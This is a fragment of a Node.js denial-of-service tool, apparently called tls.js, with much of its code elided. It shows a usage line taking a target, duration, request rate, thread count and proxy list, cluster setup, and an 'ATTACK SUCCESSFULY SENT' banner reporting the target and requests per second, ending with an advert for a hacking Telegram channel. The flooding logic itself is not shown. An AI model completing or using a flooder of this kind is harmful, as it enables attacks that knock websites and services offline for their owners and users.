...
'*'
 ...
 if (process.argv.length < 7){console.log(`node tls.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster) {
    ...
    console.clear();
    console.log(' ~•=== ATTACK SUCCESSFULY SENT ===•~ ');
    console.log ('');
    console.log ('');
    console.log('[+] Target: ' + parsedTarget.host + '\x1b[0m');
    console.log ('');
    console.log('[+] Duration: ' + args.time + '\x1b[0m');
    console.log ('');
    console.log('[+] Threads: ' + args.threads + '\x1b[0m');
    console.log('');
    console.log('[+] Requests per second: ' + args.Rate + '\x1b[0m');
    console.log('');
    console.log('[+] Method : TLS');
    console.log('');
    console.log('[+] Status: Success !');
    console.log('');
    console.log('JOIN OUR TELEGRAM CHANNEL @hackingtoolx ');
